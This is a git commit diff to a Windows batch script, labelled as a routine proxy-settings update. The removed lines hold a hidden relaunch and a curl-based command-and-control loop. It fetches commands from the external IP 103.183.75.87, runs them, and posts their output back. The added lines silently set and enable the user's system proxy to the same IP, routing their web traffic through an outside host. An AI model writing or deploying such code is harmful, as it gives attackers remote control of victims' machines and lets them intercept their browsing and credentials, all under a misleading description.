2c24b370bc1106d13a8eafda15f7be2988fa845d
asepsaepdin <122620685+asepsaepdin@users.noreply.github.com>
2026-09-17 13:52:48 +0700

    Modify proxy settings in myscript1.bat
    Updated proxy settings in the script.

--- myscript1.bat
+++ myscript1.bat
@@ -1,6 +1,3 @@
 @echo off
-if not "%1"=="am_admin" (
-    powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'am_admin' -WindowStyle Hidden"
-    exit /b
-)
-cmd /V:ON /C "SET ip=103.183.75.87:8081&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %%i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL
+PowerShell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\'Internet Settings' -Name ProxyServer -Value 103.183.75.87:8089
+PowerShell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\'Internet Settings' -Name ProxyEnable -Value 1
